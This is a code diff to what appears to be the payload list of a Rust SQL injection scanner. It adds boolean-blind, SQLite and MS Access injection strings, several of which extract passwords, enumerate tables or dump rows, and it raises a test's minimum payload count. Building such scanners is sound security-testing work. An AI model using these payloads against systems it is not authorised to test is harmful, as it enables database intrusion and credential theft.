@@ -5,7 +5,7 @@ pub fn get_payloads() -> Vec<Payload> {
         "basic", [
             ("'", "Single quote injection", Severity::High),
             ("\"", "Double quote injection", Severity::High),
-            ("'", "Backtick injection", Severity::High),
+            ("`", "Backtick injection", Severity::High),
             ("\\'", "Escaped single quote", Severity::Medium),
             ("\\\"", "Escaped double quote", Severity::Medium),
         ];
@@ -80,6 +80,31 @@ pub fn get_payloads() -> Vec<Payload> {
             ("' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)--", "PostgreSQL CASE error", Severity::High),
             ("'||UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1))||'", "Oracle UTL_INADDR", Severity::Critical),
             ("'||ctxsys.drithsx.sn(1,(SELECT password FROM users WHERE rownum=1))||'", "Oracle DRITHSX", Severity::Critical),
+        ];
+        "boolean-blind", [
+            ("' AND 1=1--", "Boolean true", Severity::High),
+            ("' AND 1=2--", "Boolean false", Severity::High),
+            ("' AND SUBSTRING((SELECT database()),1,1)='a'--", "Database name extraction", Severity::Critical),
+            ("' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", "Character-by-character extraction", Severity::Critical),
+            ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Table existence check", Severity::High),
+            ("' AND LENGTH((SELECT database()))>5--", "Length check", Severity::High),
+            ("' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'--", "Table name extraction", Severity::Critical),
+            ("' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--", "Conditional boolean", Severity::High),
+        ];
+        "sqlite", [
+            ("' UNION SELECT sql FROM sqlite_master--", "Schema extraction", Severity::Critical),
+            ("' UNION SELECT name FROM sqlite_master WHERE type='table'--", "Table enumeration", Severity::Critical),
+            ("' UNION SELECT name FROM pragma_table_info('users')--", "Column enumeration", Severity::Critical),
+            ("' AND type='table' AND name NOT LIKE 'sqlite_%'--", "Table filtering", Severity::High),
+            ("' UNION SELECT * FROM users LIMIT 1 OFFSET 0--", "Row extraction", Severity::Critical),
+            ("' AND (SELECT total_changes())>0--", "Change detection", Severity::Medium),
+        ];
+        "ms-access", [
+            ("' UNION SELECT * FROM MSysObjects--", "MSysObjects table", Severity::Critical),
+            ("' UNION SELECT * FROM [MSysObjects] WHERE Type=1--", "Table listing", Severity::Critical),
+            ("' AND (SELECT COUNT(*) FROM MSysObjects)>0--", "Object count", Severity::High),
+            ("' AND IIF(1=1,'true','false')='true'--", "IIF injection", Severity::High),
+            ("' UNION SELECT * FROM admin--", "Admin table guess", Severity::Critical),
         ];
     );
 
@@ -219,7 +244,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 50,
+            payloads.len() >= 60,
             "Must have substantial SQLi payload coverage, got {}",
             payloads.len()
         );
